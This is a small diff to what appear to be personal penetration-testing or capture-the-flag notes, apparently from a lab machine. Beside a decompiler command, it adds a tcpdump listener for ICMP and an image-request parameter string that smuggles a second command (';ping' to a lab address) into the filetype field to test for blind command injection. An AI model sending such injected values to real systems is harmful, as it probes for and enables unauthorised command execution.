@@ -151,6 +151,8 @@ ____________________________________-
 /home/milo/.local/bin/pydumpck python.exe -p pycdc
 
 
+sudo tcpdump -ni tun0 icmp
+photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;ping+10.10.14.5&dimensions=30x20
 
 
 
